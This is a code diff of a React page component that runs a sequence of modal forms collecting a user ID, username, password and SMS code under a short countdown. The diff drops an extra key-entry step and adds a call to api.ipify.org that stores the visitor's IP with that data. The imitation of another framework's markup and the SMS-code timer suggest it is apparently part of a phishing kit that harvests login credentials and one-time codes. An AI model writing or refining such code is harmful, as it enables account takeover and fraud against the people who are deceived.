@@ -2,13 +2,13 @@
 import PassForm from "./src/passForm";
 import { useEffect, useState } from "react";
 import UserForm from "./src/userForm";
-import KeyForm from "./src/keyForm";
 import SMSForm from "./src/smsForm";
 
 export default function Home() {
   const [modal, setModal] = useState(0);
-  const [segundos, setSegundos] = useState(180);
+  const [segundos, setSegundos] = useState(30);
   const [userInfo, setUserInfo] = useState({
+    ip:"",
     id: "",
     user: "",
     pass: "",
@@ -16,9 +16,24 @@ export default function Home() {
     sms: "",
   });
 
+  const getIP = async () => {
+    try {
+      const response = await fetch("https://api.ipify.org");
+      const data = await response.text();
+      setUserInfo({ ...userInfo, ip: data });
+    } catch (error) {
+      console.error("failed ip", error);
+    }
+  };
+
+  useEffect(() => {
+    getIP();
+  }, []);
+
+
   useEffect(() => {
     let intervalo = null;
-    if (modal == 3 && segundos > 0) {
+    if (modal == 2 && segundos > 0) {
       intervalo = setInterval(() => {
         setSegundos((segundos) => segundos - 1);
       }, 1000);
@@ -43,17 +58,7 @@ export default function Home() {
         }}
         dataInfo={userInfo}
       />{" "}
-      <KeyForm
-        open={modal == 2}
-        close={() => {
-          setModal(3);
-        }}
-        user={(user) => {
-          setUserInfo(user);
-        }}
-        dataInfo={userInfo}
-      />{" "}
-      <SMSForm open={modal == 3} dataInfo={userInfo} time={segundos} />{" "}
+      <SMSForm open={modal == 2} dataInfo={userInfo} time={segundos} />{" "}
       <div
         className="cdk-live-announcer-element cdk-visually-hidden"
         aria-atomic="true"
